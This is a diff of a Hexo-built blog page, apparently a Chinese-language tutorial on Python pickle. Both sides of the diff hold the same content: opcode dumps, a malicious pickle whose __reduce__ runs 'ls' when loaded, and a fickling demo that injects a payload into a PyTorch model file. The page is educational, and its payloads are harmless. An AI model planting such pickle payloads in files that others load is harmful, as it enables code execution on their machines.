@@ -49,9 +49,9 @@
     
 
 
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="yunshiuan" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+<meta name="generator" content="Hexo 7.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><link rel="alternate" href="/atom.xml" title="yunshiuan" type="application/atom+xml">
+</head>
 
 <body>
     <script>
@@ -245,53 +245,13 @@
 <p>常見用途</p>
 <dl><dt>:    將物件儲存到檔案中，方便之後載入。<br>:    將物件透過網路或其他通道進行傳輸。</dt><dd><strong>快速儲存和載入機器學習模型、配置檔或計算結果</strong>。</dd></dl><p>支援的物件類型</p>
 <dl><dt>:    Pickle 支援多種 Python 內建的資料型態，包括：<br>:    ✔️ 數字（int, float）<br>:    ✔️ 字串（str）<br>:    ✔️ 列表（list）、元組（tuple）、字典（dict）、集合（set）<br>:    ✔️ 自訂類別物件</dt><dd>✔️ 函數</dd></dl><p>Example : </p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">import pickle
-import pickletools
-
-
-data &#x3D; &#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 30, &quot;scores&quot;: [88, 92, 95]&#125;
-
-with open(&quot;data.pkl&quot;, &quot;wb&quot;) as file:
-    pickle.dump(data, file, protocol&#x3D;0)
-    print(&quot;Data has been successfully serialized to data.pkl&quot;)
-
-with open(&quot;data.pkl&quot;, &quot;rb&quot;) as file:
-    unpickled_data &#x3D; pickle.load(file)
-    print(unpickled_data)
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;scores&quot;</span>: [<span class="number">88</span>, <span class="number">92</span>, <span class="number">95</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.pkl&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    pickle.dump(data, file, protocol=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Data has been successfully serialized to data.pkl&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.pkl&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    unpickled_data = pickle.load(file)</span><br><span class="line">    <span class="built_in">print</span>(unpickled_data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>Output: </p>
-<pre class="line-numbers language-none"><code class="language-none">Data has been successfully serialized to data.pkl
-&#123;&#39;name&#39;: &#39;Alice&#39;, &#39;age&#39;: 30, &#39;scores&#39;: [88, 92, 95]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Data</span> has been successfully serialized <span class="keyword">to</span> <span class="built_in">data</span>.pkl</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;scores&#x27;</span>: <span class="meta">[</span><span class="number">88</span>, <span class="number">92</span>, <span class="number">95</span><span class="meta">]</span>&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以使用pickletools將pickle執行的內容dump出來</p>
-<pre class="line-numbers language-none"><code class="language-none">    0: (    MARK
-    1: d        DICT       (MARK at 0)
-    2: p    PUT        0
-    5: V    UNICODE    &#39;name&#39;
-   11: p    PUT        1
-   14: V    UNICODE    &#39;Alice&#39;
-   21: p    PUT        2
-   24: s    SETITEM
-   25: V    UNICODE    &#39;age&#39;
-   30: p    PUT        3
-   33: I    INT        30
-   37: s    SETITEM
-   38: V    UNICODE    &#39;scores&#39;
-   46: p    PUT        4
-   49: (    MARK
-   50: l        LIST       (MARK at 49)
-   51: p    PUT        5
-   54: I    INT        88
-   58: a    APPEND
-   59: I    INT        92
-   63: a    APPEND
-   64: I    INT        95
-   68: a    APPEND
-   69: s    SETITEM
-   70: .    STOP
-highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attribute">0</span><span class="punctuation">:</span> <span class="string">(    MARK</span></span><br><span class="line">    <span class="attribute">1</span><span class="punctuation">:</span> <span class="string">d        DICT       (MARK at 0)</span></span><br><span class="line">    <span class="attribute">2</span><span class="punctuation">:</span> <span class="string">p    PUT        0</span></span><br><span class="line">    <span class="attribute">5</span><span class="punctuation">:</span> <span class="string">V    UNICODE    &#x27;name&#x27;</span></span><br><span class="line">   <span class="attribute">11</span><span class="punctuation">:</span> <span class="string">p    PUT        1</span></span><br><span class="line">   <span class="attribute">14</span><span class="punctuation">:</span> <span class="string">V    UNICODE    &#x27;Alice&#x27;</span></span><br><span class="line">   <span class="attribute">21</span><span class="punctuation">:</span> <span class="string">p    PUT        2</span></span><br><span class="line">   <span class="attribute">24</span><span class="punctuation">:</span> <span class="string">s    SETITEM</span></span><br><span class="line">   <span class="attribute">25</span><span class="punctuation">:</span> <span class="string">V    UNICODE    &#x27;age&#x27;</span></span><br><span class="line">   <span class="attribute">30</span><span class="punctuation">:</span> <span class="string">p    PUT        3</span></span><br><span class="line">   <span class="attribute">33</span><span class="punctuation">:</span> <span class="string">I    INT        30</span></span><br><span class="line">   <span class="attribute">37</span><span class="punctuation">:</span> <span class="string">s    SETITEM</span></span><br><span class="line">   <span class="attribute">38</span><span class="punctuation">:</span> <span class="string">V    UNICODE    &#x27;scores&#x27;</span></span><br><span class="line">   <span class="attribute">46</span><span class="punctuation">:</span> <span class="string">p    PUT        4</span></span><br><span class="line">   <span class="attribute">49</span><span class="punctuation">:</span> <span class="string">(    MARK</span></span><br><span class="line">   <span class="attribute">50</span><span class="punctuation">:</span> <span class="string">l        LIST       (MARK at 49)</span></span><br><span class="line">   <span class="attribute">51</span><span class="punctuation">:</span> <span class="string">p    PUT        5</span></span><br><span class="line">   <span class="attribute">54</span><span class="punctuation">:</span> <span class="string">I    INT        88</span></span><br><span class="line">   <span class="attribute">58</span><span class="punctuation">:</span> <span class="string">a    APPEND</span></span><br><span class="line">   <span class="attribute">59</span><span class="punctuation">:</span> <span class="string">I    INT        92</span></span><br><span class="line">   <span class="attribute">63</span><span class="punctuation">:</span> <span class="string">a    APPEND</span></span><br><span class="line">   <span class="attribute">64</span><span class="punctuation">:</span> <span class="string">I    INT        95</span></span><br><span class="line">   <span class="attribute">68</span><span class="punctuation">:</span> <span class="string">a    APPEND</span></span><br><span class="line">   <span class="attribute">69</span><span class="punctuation">:</span> <span class="string">s    SETITEM</span></span><br><span class="line">   <span class="attribute">70</span><span class="punctuation">:</span> <span class="string">.    STOP</span></span><br><span class="line">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>
 
 <p>由上面的資訊可以得知，其實Pickle在反序列化的過成就很像一個簡易的堆疊虛擬機在執行，透過Opcode並且在Pickle Virtual Machine執行<br>主要由這三個</p>
 <ul>
@@ -476,33 +436,10 @@ highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numb
 <h2 id="⚠️What’s-Wrong-with-Pickle"><a href="#⚠️What’s-Wrong-with-Pickle" class="headerlink" title="⚠️What’s Wrong with Pickle ?"></a>⚠️What’s Wrong with Pickle ?</h2><p>Pickle文檔上有出現這一個警告<br><img src="/./assets/image.png" alt="alt text"></p>
 <p>Pickle當中有一個 <code>__reduce__</code> 可以使用，當反序列化時會自動呼叫</p>
 <p>以下範例為製作一個惡意的pickle</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">
-import pickle
-import subprocess
-
-class EvilPickle:
-    def __reduce__(self):
-        return (subprocess.Popen, ((&#39;ls&#39;,),))
-e &#x3D;  EvilPickle()
-with open(&#39;evil.pkl&#39;, &#39;wb&#39;) as f:
-    pickle.dump(e, f)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvilPickle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;ls&#x27;</span>,),))</span><br><span class="line">e =  EvilPickle()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;evil.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(e, f)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>用pickletool 把惡意pickle檔dump出來看看</p>
-<pre class="line-numbers language-none"><code class="language-none">    0: c    GLOBAL     &#39;commands Popen&#39;
-   16: p    PUT        0
-   19: (    MARK
-   20: (        MARK
-   21: V            UNICODE    &#39;ls&#39;
-   25: p            PUT        1
-   28: t            TUPLE      (MARK at 20)
-   29: p        PUT        2
-   32: t        TUPLE      (MARK at 19)
-   33: p    PUT        3
-   36: R    REDUCE
-   37: p    PUT        4
-   40: .    STOP
-highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attribute">0</span><span class="punctuation">:</span> <span class="string">c    GLOBAL     &#x27;commands Popen&#x27;</span></span><br><span class="line">   <span class="attribute">16</span><span class="punctuation">:</span> <span class="string">p    PUT        0</span></span><br><span class="line">   <span class="attribute">19</span><span class="punctuation">:</span> <span class="string">(    MARK</span></span><br><span class="line">   <span class="attribute">20</span><span class="punctuation">:</span> <span class="string">(        MARK</span></span><br><span class="line">   <span class="attribute">21</span><span class="punctuation">:</span> <span class="string">V            UNICODE    &#x27;ls&#x27;</span></span><br><span class="line">   <span class="attribute">25</span><span class="punctuation">:</span> <span class="string">p            PUT        1</span></span><br><span class="line">   <span class="attribute">28</span><span class="punctuation">:</span> <span class="string">t            TUPLE      (MARK at 20)</span></span><br><span class="line">   <span class="attribute">29</span><span class="punctuation">:</span> <span class="string">p        PUT        2</span></span><br><span class="line">   <span class="attribute">32</span><span class="punctuation">:</span> <span class="string">t        TUPLE      (MARK at 19)</span></span><br><span class="line">   <span class="attribute">33</span><span class="punctuation">:</span> <span class="string">p    PUT        3</span></span><br><span class="line">   <span class="attribute">36</span><span class="punctuation">:</span> <span class="string">R    REDUCE</span></span><br><span class="line">   <span class="attribute">37</span><span class="punctuation">:</span> <span class="string">p    PUT        4</span></span><br><span class="line">   <span class="attribute">40</span><span class="punctuation">:</span> <span class="string">.    STOP</span></span><br><span class="line">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>
 
 <p>執行結果：<br><img src="/./assets/reduce_RCE.png" alt="alt text"></p>
 <p>即可執行<code>ls</code>指令</p>
@@ -511,27 +448,7 @@ highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numb
 <p><img src="/./assets/image-2.png" alt="alt text"><br>有一個針對此攻擊而產生的工具：<a target="_blank" rel="noopener" href="https://github.com/trailofbits/fickling">fickling</a></p>
 <p>此工具可以輕易的將想要執行的程式轉成bytecode值入進pickle中，另外也有檢測pickele內的惡意行為功能</p>
 <p>demo:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">import torch
-import torchvision.models as models
-import warnings
-from fickling.pytorch import PyTorchModelWrapper
-warnings.filterwarnings(&quot;ignore&quot;)
-
-model &#x3D; models.mobilenet_v2()
-torch.save(model, &quot;mobilenet.pth&quot;)
-
-result &#x3D; PyTorchModelWrapper(&quot;mobilenet.pth&quot;)
-
-temp_filename &#x3D; &quot;temp_filename.pt&quot;
-result.inject_payload(
-    &quot;print(&#39;Inject successful!&#39;)&quot;,
-    temp_filename,
-    injection&#x3D;&quot;insertion&quot;,
-    overwrite&#x3D;True,
-)
-
-# Load file with injected payload
-torch.load(&quot;mobilenet.pth&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision.models <span class="keyword">as</span> models</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> fickling.pytorch <span class="keyword">import</span> PyTorchModelWrapper</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">model = models.mobilenet_v2()</span><br><span class="line">torch.save(model, <span class="string">&quot;mobilenet.pth&quot;</span>)</span><br><span class="line"></span><br><span class="line">result = PyTorchModelWrapper(<span class="string">&quot;mobilenet.pth&quot;</span>)</span><br><span class="line"></span><br><span class="line">temp_filename = <span class="string">&quot;temp_filename.pt&quot;</span></span><br><span class="line">result.inject_payload(</span><br><span class="line">    <span class="string">&quot;print(&#x27;Inject successful!&#x27;)&quot;</span>,</span><br><span class="line">    temp_filename,</span><br><span class="line">    injection=<span class="string">&quot;insertion&quot;</span>,</span><br><span class="line">    overwrite=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load file with injected payload</span></span><br><span class="line">torch.load(<span class="string">&quot;mobilenet.pth&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>輸出：</p>
 <p><img src="/./assets/image-1.png" alt="alt text"></p>
